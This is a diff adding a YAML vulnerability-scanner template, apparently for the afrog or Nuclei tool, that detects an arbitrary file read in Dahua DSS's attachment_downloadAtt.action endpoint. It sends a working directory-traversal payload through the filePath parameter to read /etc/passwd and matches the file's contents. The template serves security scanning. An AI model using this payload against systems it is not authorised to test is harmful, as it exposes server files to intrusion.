@@ -1,0 +1,27 @@
+id: dahua-dss-attachment-downloadatt-fileread
+
+info:
+  name: 大华 DSS attachment_downloadAtt.action 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    大华 DSS /portal/attachment_downloadAtt.action 可通过 filePath 目录遍历读取系统文件。
+    与已有 attachment_downloadByUrlAtt.action（file:// 协议）不是同一接口；不混入 ICC evo-apigw 路径。
+  reference:
+    - https://github.com/zan8in/afrog
+  tags: dahua,dss,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:[0-9]*:[0-9]*:"
